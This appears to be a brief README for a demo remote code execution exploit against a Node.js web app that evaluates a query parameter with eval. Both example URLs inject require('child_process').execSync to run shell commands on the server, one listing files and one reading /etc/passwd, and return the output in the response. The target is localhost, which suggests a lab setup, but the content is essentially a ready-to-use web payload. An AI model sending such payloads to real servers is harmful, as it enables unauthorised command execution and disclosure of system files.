# RCE-Node-Simple
Simple RCE exploit using eval builtin function

### Example query
```
http://localhost:9898/menus?q=arguments[1].end(require('child_process').execSync('ls -a'))
```

### Example query
```
http://localhost:9898/menus?q=arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
```
